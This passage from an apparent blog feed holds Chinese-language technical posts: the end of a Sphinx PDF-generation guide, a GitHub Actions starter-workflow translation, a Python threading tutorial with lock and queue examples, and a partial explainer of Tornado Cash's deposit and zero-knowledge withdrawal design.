class="language-bash">sudo tlmgr update --self</span></span><br></pre></td></tr></table></figure><p>然后，在 <a href="http://con.py">con.py</a> 中设置 <code>latex_engine</code> 和 <code>latex_elements</code> 两个参数，同时也可以设置 <code>latex_documents</code> 参数来设置文档。因为 ReadTheDocs 上只有 pdflatex 引擎，如果需要同时在 ReadTheDocs 和本地化都能顺利编译中文pdf的话，可以在 <a href="http://conf.py">conf.py</a> 中添加如下配置：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- Options for LaTeX output ------------------------------------------------</span></span><br><span class="line"><span class="comment"># 检查是否为 READTHEDOCS 环境</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">on_rtd = os.environ.get(<span class="string">&#x27;READTHEDOCS&#x27;</span>, <span class="literal">None</span>) == <span class="string">&#x27;True&#x27;</span></span><br><span class="line"><span class="keyword">if</span> on_rtd:</span><br><span class="line">    latex_elements = &#123;</span><br><span class="line">        <span class="string">&#x27;preamble&#x27;</span>: <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\hypersetup&#123;unicode=true&#125;</span></span><br><span class="line"><span class="string">\usepackage&#123;CJKutf8&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;00A0&#125;&#123;\nobreakspace&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2203&#125;&#123;\ensuremath&#123;\exists&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2200&#125;&#123;\ensuremath&#123;\forall&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2286&#125;&#123;\ensuremath&#123;\subseteq&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2713&#125;&#123;x&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;27FA&#125;&#123;\ensuremath&#123;\Longleftrightarrow&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;221A&#125;&#123;\ensuremath&#123;\sqrt&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;221B&#125;&#123;\ensuremath&#123;\sqrt[3]&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2295&#125;&#123;\ensuremath&#123;\oplus&#125;&#125;</span></span><br><span class="line"><span class="string">\DeclareUnicodeCharacter&#123;2297&#125;&#123;\ensuremath&#123;\otimes&#125;&#125;</span></span><br><span class="line"><span class="string">\begin&#123;CJK&#125;&#123;UTF8&#125;&#123;gbsn&#125;</span></span><br><span class="line"><span class="string">\AtEndDocument&#123;\end&#123;CJK&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 本地</span></span><br><span class="line">    latex_engine = <span class="string">&#x27;xelatex&#x27;</span></span><br><span class="line">    latex_elements = &#123;</span><br><span class="line">        <span class="string">&#x27;papersize&#x27;</span>: <span class="string">&#x27;a4paper&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pointsize&#x27;</span>: <span class="string">&#x27;11pt&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;preamble&#x27;</span>: <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\usepackage&#123;xeCJK&#125;</span></span><br><span class="line"><span class="string">\setCJKmainfont[BoldFont=STZhongsong, ItalicFont=STKaiti]&#123;STSong&#125;</span></span><br><span class="line"><span class="string">\setCJKsansfont[BoldFont=STHeiti]&#123;STXihei&#125;</span></span><br><span class="line"><span class="string">\setCJKmonofont&#123;STFangsong&#125;</span></span><br><span class="line"><span class="string">\XeTeXlinebreaklocale &quot;zh&quot;</span></span><br><span class="line"><span class="string">\XeTeXlinebreakskip = 0pt plus 1pt</span></span><br><span class="line"><span class="string">\parindent 2em</span></span><br><span class="line"><span class="string">\definecolor&#123;VerbatimColor&#125;&#123;rgb&#125;&#123;0.95,0.95,0.95&#125;</span></span><br><span class="line"><span class="string">\setcounter&#123;tocdepth&#125;&#123;3&#125;</span></span><br><span class="line"><span class="string">\renewcommand\familydefault&#123;\ttdefault&#125;</span></span><br><span class="line"><span class="string">\renewcommand\CJKfamilydefault&#123;\CJKrmdefault&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 设置文档</span></span><br><span class="line">latex_documents = [</span><br><span class="line">    (master_doc, <span class="string">&#x27;sphinx.tex&#x27;</span>, <span class="string">&#x27;你的第一本 Sphinx 书&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;作者：qiwihui&#x27;</span>, <span class="string">&#x27;manual&#x27;</span>, <span class="literal">True</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>最后，编译：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make latexpdf</span></span><br></pre></td></tr></table></figure><p><code>make latexpdf</code> 会完成 rst转换为 tex 并将 tex 生成 PDF，可以手动分开：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make latex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> build/latex</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><p>在 <code>build/latex</code> 下可以查看到生成的 PDF 文档。</p><h4><span id="zi-ti">字体</span></h4><p>使用 <code>fc-list</code> 来获取字体信息，修改相应字体设置即可。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install fontconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fc-list :lang=zh</span></span><br></pre></td></tr></table></figure><h4><span id="yu-dao-de-wen-ti">遇到的问题:</span></h4><ol><li>遇到 <code>&quot;! LaTeX Error: File '*.sty' not found.&quot;</code> 类的问题：</li></ol><p>解决：使用 <code>sudo tlmgr install</code> 安装相应的包即可。</p><h2><span id="zong-jie">总结</span></h2><p>简单过了一下整个文档的流程，总体来说，Sphinx非常适合用来编写项目文档，reStructuredText 比起 Markdown 也有太多的优势，值得推荐。</p><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/57#issuecomment-468518848"><strong>qiwihui</strong></a> on: <strong>3/1/2019</strong></p></blockquote><p>添加 gooogle analytics</p><ul><li><a href="http://www.milos.curuvija.com/miscellaneous/sphinx/sphinx_google_analytics_integration.html">http://www.milos.curuvija.com/miscellaneous/sphinx/sphinx_google_analytics_integration.html</a></li><li><a href="https://www.ericholscher.com/blog/2009/apr/5/adding-google-analytics-sphinx-docs/">https://www.ericholscher.com/blog/2009/apr/5/adding-google-analytics-sphinx-docs/</a></li></ul>]]></content>
    
    <summary type="html">
    
      使用 Sphinx 撰写技术文档并生成 PDF 总结
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第7天：入门工作流程</title>
    <link href="https://qiwihui.com/qiwihui-blog-90/"/>
    <id>https://qiwihui.com/qiwihui-blog-90/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>如果你仅创建了一个或两个GitHub Actions工作流，则可能对如何起步不太关注，但是GitHub Actions团队关注如何起步，他们努力工作，以使你能尽可能轻松地开始使用Actions。</p><p>在创建新工作流程时，GitHub首先要考虑的是存储库中的代码类型。GitHub Actions使用成熟的<a href="https://github.com/github/linguist">语言工具</a>来了解你的存储库包含哪种代码。这是为GitHub许多其他部分提供支持的工具，其中包括存储库主页上的语言统计栏。</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/77240850-d0269280-6c25-11ea-8b6b-759de7111087.png" alt="image"></p><p>对于这个拥有大量JavaScript的存储库，GitHub Actions将选择两个可能的工作流程──运行 <code>npm run build</code> 和 <code>npm test</code> 的Node.js CI/CD工作流程（这对应用程序有用），以及执行相同构建和测试运行的打包工作流程，然后将程序包发布到GitHub Packages中。</p><p><img src="https://user-images.githubusercontent.com/3297411/77240893-3ad7ce00-6c26-11ea-8335-ce18b0802ca4.png" alt="image"></p><p>GitHub Actions不仅具有构建和测试项目的能力，还有工作流可以帮助你开始将应用程序部署到云中，无论是AWS，Azure还是Google Cloud。</p><p><img src="https://user-images.githubusercontent.com/3297411/77240898-504cf800-6c26-11ea-82b1-20faf590faf6.png" alt="image"></p><p>而且，当然，尽管和语言学家一样好，它也不是完美的。许多人在同一存储库中混合了不同的项目，因此你还可以扩展整个启动程序工作流列表。</p><p><img src="https://user-images.githubusercontent.com/3297411/77240908-75da0180-6c26-11ea-9612-42b3c634aeb6.png" alt="image"></p><p>如果你想帮助改善入门工作流程──无论是对现有工作流程进行更改，还是添加全新的语言，都可以在<a href="https://github.com/actions/starter-workflows">GitHub上</a>进行提交。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_7_starter_workflows.html">https://www.edwardthomson.com/blog/github_actions_7_starter_workflows.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第7天：入门工作流程
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>16. 多线程 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-134/"/>
    <id>https://qiwihui.com/qiwihui-blog-134/</id>
    <published>2022-08-13T01:54:25.300Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>在本文中，我们讨论了如何在Python中使用 <code>threading</code> 模块。</p><ul><li>如何创建和启动多个线程</li><li>如何等待线程完成</li><li>如何在线程之间共享数据</li><li>如何使用锁（ <code>lock</code> ）来防止竞态情况</li><li>什么是守护线程</li><li>如何使用 <code>Queue</code> 进行线程安全的数据/任务处理。</li></ul><span id="more"></span><h3><span id="chuang-jian-he-yun-xing-xian-cheng">创建和运行线程</span></h3><p>你可以使用 <code>threading.Thread()</code> 创建一个线程。 它包含两个重要的参数：</p><ul><li><code>target</code>：线程启动时要调用的该线程的可调用对象（函数）</li><li><code>args</code>：目标函数的（函数）参数。 这必须是一个元组</li></ul><p>使用 <code>thread.start()</code> 启动线程</p><p>调用 <code>thread.join()</code> 告诉程序在继续执行其余代码之前，应等待该线程完成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    threads = []</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建线程，并给每一个线程分配函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        thread = Thread(target=square_numbers)</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动所有线程</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待所有线程结束</span></span><br><span class="line">    <span class="comment"># 阻塞主线程直到所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h3><span id="zai-xian-cheng-zhi-jian-gong-xiang-shu-ju">在线程之间共享数据</span></h3><p>由于线程位于相同的内存空间中，因此它们可以访问相同的（公共）数据。 因此，例如，你可以简单地使用所有线程都具有读取和写入访问权限的全局变量。</p><p>任务：创建两个线程，每个线程应访问当前数据库值，对其进行修改（在这种情况下，仅将其增加1），然后将新值写回到数据库值中。 每个线程应执行10次此操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有线程可以访问全局变量</span></span><br><span class="line">database_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>():</span><br><span class="line">    <span class="keyword">global</span> database_value <span class="comment"># 需要可以修改全局变量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取本地副本（模拟数据获取）</span></span><br><span class="line">    local_copy = database_value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟一些修改操作</span></span><br><span class="line">    local_copy += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将计算的性质写入全局变量</span></span><br><span class="line">    database_value = local_copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start value: &#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    t1 = Thread(target=increase)</span><br><span class="line">    t2 = Thread(target=increase)</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;End value:&#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start value:  <span class="number">0</span></span><br><span class="line">End value: <span class="number">1</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="ru-he-shi-yong-suo">如何使用锁</span></h3><p>请注意，在上面的示例中，2个线程将值递增1，因此将执行2个递增操作。但是，为什么最终值是1而不是2？</p><h3><span id="jing-tai-tiao-jian">竞态条件</span></h3><p>这里发生了竞态情况。当两个或多个线程可以访问共享数据并且它们试图同时更改它们时，就会发生竞态情况。因为线程调度算法可以随时在线程之间交换，所以你不知道线程尝试访问共享数据的顺序。在我们的例子中，第一个线程访问 <code>database_value</code>（0）并将其存储在本地副本中。然后将其递增（ <code>local_copy</code> 现在为1）。利用我们的 <code>time.sleep()</code> 函数，该函数仅模拟一些耗时的操作，在此期间，程序将交换到第二个线程。这还将检索当前的 <code>database_value</code>（仍为0），并将 <code>local_copy</code> 递增为1。现在，两个线程都有一个值为1的本地副本，因此两个线程都将1写入全局 <code>database_value</code>。这就是为什么最终值是1而不是2的原因。</p><h3><span id="shi-yong-suo-bi-mian-jing-tai-tiao-jian">使用锁避免竞态条件</span></h3><p>锁（也称为互斥锁）是一种同步机制，用于在存在许多执行线程的环境中强制限制对资源的访问。锁具有两种状态：<strong>锁定</strong>和<strong>解锁</strong>。如果状态是锁定的，则在状态再次被解锁之前，不允许其他并发线程进入此代码段。</p><p>两个函数很重要：</p><ul><li><code>lock.acquire()</code>：这将锁定状态并阻塞</li><li><code>lock.release()</code>：这将再次解锁状态。</li></ul><p>重要提示：块获得后，你应始终再次释放它！</p><p>在我们的示例中，检索和修改数据库值的关键代码部分现已锁定。这样可以防止第二个线程同时修改全局数据。我们的代码没有太大变化。所有新更改都在下面的代码中进行了注释。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import Lock</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">database_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>(<span class="params">lock</span>):</span><br><span class="line">    <span class="keyword">global</span> database_value </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 锁定状态</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    </span><br><span class="line">    local_copy = database_value</span><br><span class="line">    local_copy += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    database_value = local_copy</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解锁状态</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建锁</span></span><br><span class="line">    lock = Lock()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start value: &#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将锁传递给目标函数</span></span><br><span class="line">    t1 = Thread(target=increase, args=(lock,)) <span class="comment"># 注意锁后的逗号，因为args必须是一个元组</span></span><br><span class="line">    t2 = Thread(target=increase, args=(lock,))</span><br><span class="line"></span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;End value:&#x27;</span>, database_value)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end main&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start value:  <span class="number">0</span></span><br><span class="line">End value: <span class="number">2</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-suo-zuo-wei-shang-xia-wen-guan-li-qi">使用锁作为上下文管理器</span></h3><p>在 <code>lock.acquire()</code> 之后，你应该永远不要忘记调用 <code>lock.release()</code> 来解锁代码。 你还可以将锁用作上下文管理器，这将安全地锁定和解锁你的代码。 建议以这种方式使用锁：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increase</span>(<span class="params">lock</span>):</span><br><span class="line">    <span class="keyword">global</span> database_value </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> lock: </span><br><span class="line">        local_copy = database_value</span><br><span class="line">        local_copy += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        database_value = local_copy</span><br></pre></td></tr></table></figure><h3><span id="zai-python-zhong-shi-yong-dui-lie">在Python中使用队列</span></h3><p>队列可用于多线程和多进程环境中的线程安全/进程安全的数据交换和数据处理。</p><h3><span id="dui-lie">队列</span></h3><p>队列是遵循先进先出（FIFO）原理的线性数据结构。 一个很好的例子是排队等候的客户队列，其中首先服务的是第一位的客户。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建队列</span></span><br><span class="line">q = Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">q.put(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">q.put(<span class="number">2</span>) <span class="comment"># 2 1</span></span><br><span class="line">q.put(<span class="number">3</span>) <span class="comment"># 3 2 1 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在 q 看起来是这样的:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 1 --&gt; front</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取和移除第一个元素</span></span><br><span class="line">first = q.get() <span class="comment"># --&gt; 1</span></span><br><span class="line"><span class="built_in">print</span>(first) </span><br><span class="line"></span><br><span class="line"><span class="comment"># q 现在看起来是这样的:</span></span><br><span class="line"><span class="comment"># back --&gt; 3 2 --&gt; front</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3><span id="zai-duo-xian-cheng-zhong-shi-yong-dui-lie">在多线程中使用队列</span></h3><p>带有队列的操作是线程安全的。重要方法是：</p><ul><li><code>q.get()</code>：删除并返回第一项。默认情况下，它会阻塞，直到该项可用为止。</li><li><code>q.put(item)</code>：将元素放在队列的末尾。默认情况下，它会阻塞，直到有空闲插槽可用为止。</li><li><code>q.task_done()</code>：指示先前入队的任务已完成。对于每个 <code>get()</code>，在完成此项任务后，都应调用此函数。</li><li><code>q.join()</code>：阻塞直到队列中的所有项目都已获取并处理（已为每个项目调用 <code>task_done()</code>）。</li><li><code>q.empty()</code>：如果队列为空，则返回True。</li></ul><p>以下示例使用队列来交换0至19之间的数字。每个线程都调用worker方法。在无限循环内，线程等待直到由于阻塞 <code>q.get()</code> 调用而使项可用为止。项可用时，将对其进行处理（即，仅在此处打印），然后 <code>q.task_done()</code> 告知队列处理已完成。在主线程中，创建10个<strong>守护</strong>线程。这意味着它们在主线程死亡时自动死亡，因此不再调用worker方法和无限循环。然后，队列中填充了项，并且worker方法可以继续使用可用项。最后，需要 <code>q.join()</code> 来阻塞主线程，直到获得并处理所有项为止。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock, current_thread</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">q, lock</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        value = q.get()  <span class="comment"># 阻塞知道有可用项</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 做一些处理...</span></span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            <span class="comment"># 使用锁阻止其他打印</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;in <span class="subst">&#123;current_thread().name&#125;</span> got <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对弈每一个 get()，随后对 task_done() 的调用告诉队列该项的处理已完成。</span></span><br><span class="line">        <span class="comment"># 如果完成所有任务，则 q.join() 可以取消阻塞</span></span><br><span class="line">        q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        t = Thread(name=<span class="string">f&quot;Thread<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>, target=worker, args=(q, lock))</span><br><span class="line">        t.daemon = <span class="literal">True</span>  <span class="comment"># 当主线程死亡时死亡</span></span><br><span class="line">        t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用项填充队列</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        q.put(x)</span><br><span class="line"></span><br><span class="line">    q.join()  <span class="comment"># 阻塞直到队列中的所有项被获取并处理</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main done&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span> Thread1 got <span class="number">0</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">1</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">11</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">12</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">13</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">14</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">15</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">16</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">17</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">18</span></span><br><span class="line"><span class="keyword">in</span> Thread2 got <span class="number">19</span></span><br><span class="line"><span class="keyword">in</span> Thread8 got <span class="number">5</span></span><br><span class="line"><span class="keyword">in</span> Thread4 got <span class="number">9</span></span><br><span class="line"><span class="keyword">in</span> Thread1 got <span class="number">10</span></span><br><span class="line"><span class="keyword">in</span> Thread5 got <span class="number">2</span></span><br><span class="line"><span class="keyword">in</span> Thread6 got <span class="number">3</span></span><br><span class="line"><span class="keyword">in</span> Thread9 got <span class="number">6</span></span><br><span class="line"><span class="keyword">in</span> Thread7 got <span class="number">4</span></span><br><span class="line"><span class="keyword">in</span> Thread10 got <span class="number">7</span></span><br><span class="line"><span class="keyword">in</span> Thread3 got <span class="number">8</span></span><br><span class="line">main done</span><br></pre></td></tr></table></figure><h3><span id="shou-hu-xian-cheng">守护线程</span></h3><p>在以上示例中，使用了守护线程。 守护线程是后台线程，它们在主程序结束时自动消失。 这就是为什么可以退出 worker 方法内的无限循环的原因。 没有守护进程，我们将不得不使用诸如 <code>threading.Event</code> 之类的信号机制来停止 worker。 但请注意守护进程：它们会突然停止，并且它们的资源（例如打开的文件或数据库事务）可能无法正确释放/完成。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      16. 多线程 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Tornado Cash 基本原理</title>
    <link href="https://qiwihui.com/qiwihui-blog-164/"/>
    <id>https://qiwihui.com/qiwihui-blog-164/</id>
    <published>2022-06-09T03:16:33.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>假设地址 A 发送了 100 ETH 给地址 B，由于在区块链上所有的数据都是公开的，所以全世界都知道地址 A 和地址 B 进行了一次交易，如果地址A和地址 B 属于同一个用户 Alice，则大家知道Alice仍然拥有 100 ETH，如果地址B属于用户 Bob，则大家知道 Bob 现在有 100ETH 了。一个问题就是：如何在交易的过程中保持隐蔽呢，或者说隐藏发送用户与接收用户之前的练习？那就要用到 Tornado Cash。</p><p>用户将资金存入Tornado Cash，然后将资金提取到另一个地址中，在区块链上记录上，这两个地址之间的联系就大概率断开了。那 Tornado Cash 是如何做到的呢？</p><span id="more"></span><h2><span id="cun-kuan-deposit-guo-cheng">存款（deposit）过程</span></h2><p>首先我们看一下存款过程。用户在存款时需要生产两个随机数 secret 和 nullifier，并计算这两个数的一个哈希 commitment = hash(secret, nullifier)，然后用户将需要混币的金额（比如 1 ETH）和 commitment 发送给 TC 合约的 deposit 函数，TC合约将保存这两个数据，commitment之后会用于提取存入的资金。</p><p>同时，用户会得到一个凭证，通过这个凭证，用户（或者任何人）就可以提取存入的资金。</p><h3><span id="wei-shi-me-cun-ru-1-eth">为什么存入 1 ETH？</span></h3><p>如果不同的用户会存入不同的金额，比如 Alice 和 Bob 存入 1 ETH，Chris 存入 73 ETH，当取出存款时，某个地址提取了 73 ETH，我们会有很大程度怀疑这个地址属于 Chris。因此，在TC 合约中规定了每次存入的金额为 1 ETH，这样就不会有地址与其他地址不一致。</p><p>实际上，TC 有不同金额的 ETH 存款池，分别为 0.1，1，10，100，以满足不同数量的存取款需求。</p><h2><span id="qu-kuan-withdraw-guo-cheng">取款（withdraw）过程</span></h2><p>当进行取款时，一种错误方法是将之前随机生成的 secret 和 nullifier 作为参数发送给合约的取款函数，合约检查 hash(secret,nullifier) 是否等于之前保存的 commitment，如果相等就发送 1 ETH给取款者。但是这个过程就使得取款者的身份暴露了，因为 hash 过程是不可逆的，当我们从存款日志中找到相等的commitment时，我们就可以通过 commitment 建立存款者和取款者之间的联系，因为只有这个存款者知道获得 commitment 的 secret 和 nullifier。</p><p>如果解决这个过程呢？如果有人有一种方法可以证明他知道一组(secret, nullifier) 使得 hash(secret, nullifier) 在合约记录的commitment列表中，但是却不公开这组(secret, nullifier) ，那这个人就可以只用发送这个证明给合约进行验证，就可以证明他拥有之前存入过资金，当却不知道对应于哪一组存入的资金，所以仍然保持匿名。</p><p>这个证明就是零知识证明，它可以证明你知道某个信息但却不用公开这个信息。TC 使用的零知识证明称为 